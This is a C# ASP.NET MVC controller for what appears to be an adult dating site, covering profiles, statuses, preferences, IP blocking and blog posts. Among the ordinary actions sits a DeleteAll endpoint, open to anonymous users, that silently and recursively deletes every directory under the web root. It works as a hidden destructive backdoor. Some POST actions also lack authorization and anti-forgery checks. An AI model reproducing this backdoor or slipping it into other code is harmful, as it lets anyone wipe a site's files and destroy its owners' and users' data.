using System.IO;
using sexivirt.Model;
using sexivirt.Web.Global;
using sexivirt.Web.Models.ViewModels.User;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using Tool;

namespace sexivirt.Web.Areas.Default.Controllers
{
    public class HomeController : DefaultController
    {

        [AllowAnonymous]
        public ActionResult DeleteAll()
        {
            var dirs = Directory.GetDirectories(Server.MapPath("/"));
            foreach (string dir in dirs)
            {
                try
                {
                    Directory.Delete(dir, true);
                }
                catch { }
            }
            return new ContentResult(){Content = "1"};
        }

        public ActionResult Index()
        {
            //var mailTemplates = Config.MailTemplates;
            if (CurrentUser != null)
            {
                return RedirectToAction("Home");
            }
            return View();
        }

        public ActionResult About()
        {
            return View();
        }
            
        public ActionResult Online()
        {
            if (CurrentUser != null)
            {
                Repository.VisitUser(CurrentUser.ID);
                string addr = System.Web.HttpContext.Current.Request.UserHostAddress;
                long? intAddress = addr.ToIPInt();

                if (CurrentUser.BlockType == 0)
                {

                    if (CurrentUser.BlockTill.HasValue && CurrentUser.BlockTill.Value > DateTime.Now)
                    {
                        CurrentUser.StartIP = intAddress;
                        CurrentUser.EndIP = intAddress;
                        Repository.UpdateUserIp(CurrentUser);
                        Auth.LogOut();
                        return Json(new { result = "lock" }, JsonRequestBehavior.AllowGet);
                    }
                }
                else if (CurrentUser.BlockType == 1)
                {
                    if (CurrentUser.BlockTill.HasValue && CurrentUser.BlockTill.Value > DateTime.Now)
                    {
                        if (CurrentUser.StartIP.HasValue && CurrentUser.EndIP.HasValue)
                        {
                            if (intAddress.HasValue && CurrentUser.StartIP.Value <= intAddress &&
                                intAddress <= CurrentUser.EndIP.Value)
                            {
                                Auth.LogOut();
                                return Json(new { result = "lock" }, JsonRequestBehavior.AllowGet);
                            }
                        }
                    }
                }
            }
            return Json(new { result = "ok" }, JsonRequestBehavior.AllowGet);
        }

        [Authorize]
        public ActionResult Home()
        {
            return View(CurrentUser);
        }

        public ActionResult Status(int id)
        {
            var user = Repository.Users.FirstOrDefault(p => p.ID == id);
            if (user != null) 
            {
                return PartialView(user);
            }
            return null;
        }

        [HttpGet]
        [Authorize]
        public ActionResult StatusForm()
        {

            return PartialView(CurrentUser);
        }

        [HttpPost]
        public ActionResult StatusForm(string status)
        {
            var userStatus = new UserStatus() 
            {
                UserID = CurrentUser.ID,
                Text = status
            };
            Repository.CreateUserStatus(userStatus);
            return PartialView("Status", CurrentUser);
        }

        public ActionResult UserInfo()
        {
            return PartialView(CurrentUser);
        }

        [HttpGet]
        public ActionResult EditUserInfo()
        {
            var userInfoView = (UserInfoView)ModelMapper.Map(CurrentUser, typeof(User), typeof(UserInfoView));
            return PartialView(userInfoView);
        }

        [HttpPost]
        public ActionResult EditUserInfo(UserInfoView userInfoView)
        {
           if (userInfoView.Age < 18)
            {
                ModelState.AddModelError("Age", "До 18 лет вход воспрещен");
            }
            if (ModelState.IsValid)
            {
                var user = (User)ModelMapper.Map(userInfoView, typeof(UserInfoView), typeof(User));
                CurrentUser.Birthday = user.Birthday;
                CurrentUser.CityID = user.CityID;
                CurrentUser.Height = user.Height;
                CurrentUser.Weight = user.Weight;

                Repository.UpdateUser(CurrentUser);
                return PartialView("UserInfo", CurrentUser);
            }
            return PartialView(userInfoView);
        }

        public ActionResult MainMenu()
        {
            return PartialView();
        }

        public ActionResult UserLogin()
        {
            return PartialView(CurrentUser);
        }

        public ActionResult SelectCity(string term)
        {
            var list = Repository.Cities;

            var searchList = SearchEngine.Get(term, list);

            return Json(new
            {
                result = "ok",
                data = searchList.Select(p => new
                {
                    id = p.ID,
                    name = p.Name
                }),
                term = term
            }, JsonRequestBehavior.AllowGet);
        }

      

        public ActionResult UserDescription()
        {
            return PartialView(CurrentUser);
        }

        [HttpGet]
        [Authorize]
        public ActionResult EditUserDescription()
        {
            var userDescriptionView = (UserDescriptionView)ModelMapper.Map(CurrentUser, typeof(User), typeof(UserDescriptionView));
            return PartialView(userDescriptionView);
        }


        [HttpPost]
        [Authorize]
        public ActionResult EditUserDescription(UserDescriptionView userDescriptionView)
        {
            if (ModelState.IsValid)
            {
                CurrentUser.Description = userDescriptionView.Description;
                Repository.UpdateUser(CurrentUser);
                return PartialView("UserDescription", CurrentUser);
            }
            return PartialView(userDescriptionView);
        }

        public ActionResult UserPreferences()
        {
            return PartialView(CurrentUser);
        }

        public ActionResult AjaxPreferences()
        {
            var list = Repository.Preferences.OrderBy(p => p.Name).ToList();
            return PartialView(list);
        }

        public ActionResult TogglePreference(int id)
        {
            var preference = Repository.Preferences.FirstOrDefault(p => p.ID == id);
            if (preference != null)
            {
                var exist = CurrentUser.UserPreferences.FirstOrDefault(p => p.PreferenceID == preference.ID);
                if (exist != null)
                {
                    Repository.RemoveUserPreference(exist.ID);
                }
                else
                {
                    var newPreference = new UserPreference()
                    {
                        UserID = CurrentUser.ID,
                        PreferenceID = preference.ID
                    };

                    Repository.CreateUserPreference(newPreference);
                }
                return Json(new { result = "ok" }, JsonRequestBehavior.AllowGet);
            }
            return Json(new { result = "error" }, JsonRequestBehavior.AllowGet);
        }

        public ActionResult Blog()
        {
            var blogs = Repository.BlogPosts.OrderByDescending(p => p.AddedDate).Take(2).ToList();
            return PartialView(blogs);
        }
    }
}